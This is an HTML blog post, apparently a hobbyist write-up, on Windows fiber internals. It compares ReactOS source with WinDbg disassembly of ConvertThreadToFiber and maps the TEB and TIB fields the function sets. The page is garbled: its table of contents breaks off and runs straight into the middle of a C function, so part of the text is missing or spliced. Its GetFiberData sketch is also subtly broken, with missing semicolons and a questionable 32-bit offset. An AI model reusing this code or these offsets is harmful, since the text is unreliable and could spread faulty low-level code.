<html>
    <head>
        <title>Here Be Dragons</title>
        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🐉</text></svg>">
        <link rel="stylesheet" href="dank.css">
    </head>
    <body>
        <center>
        <div style="display: inline-block; text-align: left;">
        <pre>
<!--
    Ascii art thanks to
    https://fsymbols.com/generators/carty/
-->

██████████████████████
█─▄▄─█▄─▀─▄█─▄▄─█─▄▄─█
█─██─██▀─▀██─██─█─██─█
▀▄▄▄▄▀▄▄█▄▄▀▄▄▄▄▀▄▄▄▄▀

        </pre>
    </div>
    </center>
        <div style="width: 60%;">
            <pre class="text">
                <h2>A Foray For Fun into Windows Fibers</h2>
The Windows fiber API has been described as one of the "most elegant" APIs available to the Windows programmer for manual execution scheduling.
I'm by no means an expert in how fibers work, nor how to deploy them into a large-scale application.
There is not a lot of documentation about how fibers work internally, so I thought it might be at least interesting or helpful to write about some of what I found.
            </pre>
            <h3>ToC</h3>
<ul>
    <li>🚀<a href="#0">0x00:</a> About</li>
    <li>🚀<a href="#1">0x01:</a> Intro</li>


    /* Are we already a fiber? */
    Teb = NtCurrentTeb();
    if (Teb->HasFiberData)
    {
        /* Fail */
        SetLastError(ERROR_ALREADY_FIBER);
        return NULL;
    }

    /* Allocate the fiber */
    Fiber = RtlAllocateHeap(RtlGetProcessHeap(),
                            0,
                            sizeof(FIBER));
    if (!Fiber)
    {
        /* Fail */
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return NULL;
    }

    <b>. . .</b>
    <b> TRUNCATED, boring shit I don't care about </b>
    <b>. . .</b>

    /* Associate the fiber to the current thread */
    <b class="green">Teb->NtTib.FiberData = Fiber;
    Teb->HasFiberData = TRUE; // what we really care about</b>

    /* Return opaque fiber data */
    <b class="green">return (LPVOID)Fiber; // MSDN says this is a pointer to the fiber, rather than the fiber object
    // HMMMMMMM    
    </b> 
}
</pre>
<pre class="text">
Compare this with the disassembly of KernelBase!ConvertThreadToFiberEx
</pre>
<pre class="code">
KERNELBASE!ConvertThreadToFiber:
00007ffc`cdd58160 48895c2408         mov     qword ptr [rsp+8], rbx ss:000000c4`533bf970={FiberBlog!_NULL_IMPORT_DESCRIPTOR <PERF> (FiberBlog+0x22015) (00007ff6`49e62015)}
00007ffc`cdd58165 4889742410         mov     qword ptr [rsp+10h], rsi
00007ffc`cdd5816a 57                 push    rdi
00007ffc`cdd5816b 4883ec20           sub     rsp, 20h
<b class="green">00007ffc`cdd5816f 65488b3c2530000000 mov     rdi, qword ptr gs:[30h] 
; rdi gets a pointer to the current _NT_TIB</b>

<b>. . .</b>
<b> T R U N C A T E D </b>
<b>. . .</b>

<b class="green">
00007ffc`cdd58252 66838fee17000004   or      word ptr [rdi+17EEh], 4
; Setting the Teb->HasFiberData flag to True
</b>

<b class="green">
00007ffc`cdd5825a 48895720           mov     qword ptr [rdi+20h], rdx
; Setting Teb->FiberData
</b>
00007ffc`cdd5825e 488b742438         mov     rsi, qword ptr [rsp+38h]
00007ffc`cdd58263 488bc3             mov     rax, rbx
00007ffc`cdd58266 488b5c2430         mov     rbx, qword ptr [rsp+30h]
00007ffc`cdd5826b 4883c420           add     rsp, 20h
00007ffc`cdd5826f 5f                 pop     rdi
00007ffc`cdd58270 c3                 ret 
</pre>
<pre class="text">

The behavior is, for all semantic purposes, identical. Thank you ReactOS team :)
So what's the deal with the TEB and TIB?
WELL, I'm glad you asked.

Let's take the two instructions from the disassembly and check to see what offsets they're referencing.
<b>(rdi == TEB)</b>
</pre>
<pre class="code">
<b class="green">
00007ffc`cdd58252 66838fee17000004   or      word ptr [rdi+17EEh], 4
; Setting the Teb->HasFiberData flag to True
</b><b class="green">
00007ffc`cdd5825a 48895720           mov     qword ptr [rdi+20h], rdx
; Setting Teb->FiberData
</b>    
</pre>
<pre class="text">
Examining the TEB structure, we find that the WORD referenced by <b>*(rdi+0x17ee)</b> actually represents bit flags for different features in the process.
</pre>
<pre class="code">
0:000> dt nt!_TEB
ntdll!_TEB
    +0x17ee SameTebFlags     : Uint2B
    +0x17ee SafeThunkCall    : Pos 0, 1 Bit
    +0x17ee InDebugPrint     : Pos 1, 1 Bit
    <b class="green">+0x17ee HasFiberData     : Pos 2, 1 Bit ; "or word ptr [rdi+17EEh], 4" sets this to TRUE</b> 
    +0x17ee SkipThreadAttach : Pos 3, 1 Bit
    +0x17ee WerInShipAssertCode : Pos 4, 1 Bit
    +0x17ee RanProcessInit   : Pos 5, 1 Bit
    +0x17ee ClonedThread     : Pos 6, 1 Bit
    +0x17ee SuppressDebugMsg : Pos 7, 1 Bit
    +0x17ee DisableUserStackWalk : Pos 8, 1 Bit
    +0x17ee RtlExceptionAttached : Pos 9, 1 Bit
    +0x17ee InitialThread    : Pos 10, 1 Bit
    +0x17ee SessionAware     : Pos 11, 1 Bit
    +0x17ee LoadOwner        : Pos 12, 1 Bit
    +0x17ee LoaderWorker     : Pos 13, 1 Bit
    +0x17ee SkipLoaderInit   : Pos 14, 1 Bit
    +0x17ee SpareSameTebBits : Pos 15, 1 Bit
</pre>
<pre class="text">
We can also see that the <b>QWORD PTR</b> referenced by <b>*(rdi+0x20)</b> is a FiberData pointer in the process' TIB.
</pre>
<pre class="code">
0:000> dt nt!_NT_TIB
ntdll!_NT_TIB
    +0x000 ExceptionList    : Ptr64 _EXCEPTION_REGISTRATION_RECORD
    +0x008 StackBase        : Ptr64 Void
    +0x010 StackLimit       : Ptr64 Void
    +0x018 SubSystemTib     : Ptr64 Void
    <b class="green">+0x020 FiberData        : Ptr64 Void ; This is what GetFiberData fetches</b>
    +0x020 Version          : Uint4B
    +0x028 ArbitraryUserPointer : Ptr64 Void
    +0x030 Self             : Ptr64 _NT_TIB
</pre>
<pre class="text">
Neat. So our FiberData pointer and HasFiberData flag both live in the TEB.
One could define a GetFiberData macro essentially as a few intrinsic functions equivalent to:
</pre>
<pre class="code">
void* GetFiberData(){
    #ifdef _WIN64
    return __readgsqword(0x20) // mov rax, gs:[20]
    #else
    return __readfsdword(0x20) // mov eax, fs:[20]
    #endif
}
</pre>
<pre class="text">
So how does CreateFiber store the instruction pointer of the function we desire?
Let's again go back to ReactOS for definition of <a href="https://doxygen.reactos.org/d9/d44/dll_2win32_2kernel32_2client_2fiber_8c_source.html">CreateFiberEx</a> (this time without truncation):
</pre>
<pre class="code">
/*
* @implemented
*/
LPVOID
WINAPI
CreateFiberEx(_In_ SIZE_T dwStackCommitSize,
            _In_ SIZE_T dwStackReserveSize,
            _In_ DWORD dwFlags,
            _In_ LPFIBER_START_ROUTINE lpStartAddress,
